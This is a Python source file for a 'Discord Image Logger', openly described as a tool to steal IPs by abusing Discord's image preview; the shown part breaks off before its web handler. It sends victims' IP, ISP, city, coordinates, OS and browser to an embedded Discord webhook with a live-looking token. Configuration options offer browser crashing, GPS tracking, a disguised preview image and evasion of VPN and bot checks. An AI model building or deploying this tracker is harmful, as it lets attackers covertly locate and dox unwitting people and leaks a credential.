# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1131906776544071751/WSJY3TJgvaMxzf0bWZ3JXDAX80fWYxsaYBmwXetkgZY6Tq1BWaBzhxltscNH4IMZWqj3",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
